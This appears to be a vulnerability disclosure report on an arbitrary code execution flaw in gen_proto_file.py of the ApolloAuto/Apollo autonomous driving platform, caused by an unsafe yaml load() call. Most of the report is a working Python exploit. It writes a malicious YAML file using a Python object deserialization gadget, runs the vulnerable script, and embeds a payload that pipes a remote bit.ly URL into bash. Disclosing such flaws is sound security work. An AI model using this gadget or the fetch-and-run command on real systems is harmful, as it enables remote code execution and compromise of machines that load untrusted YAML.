# Description
**Arbitrary Code Excecution** in gen_proto_file.py in ApolloAuto/Apollo.
An open autonomous driving platform.
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **yaml**. fix is to be done **gen_proto_file.py**
# Exploit code
**Python File**
```python
import os
exploit = '''protocol_conf: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('curl -s -L http://bit.ly/10hA8iC | bash')"
'''
os.system('git clone https://github.com/ApolloAuto/apollo.git')
os.chdir('apollo/modules/tools/gen_vehicle_protocol/')
os.system('rm exploit.yml')
open('exploit.yml','w+').write(exploit)
os.system('python3 gen_proto_file.py exploit.yml')
```
# POC
* Run the exploit code 

![](https://cdn.discordapp.com/attachments/749019614352244777/787012612868669440/apollo.gif)
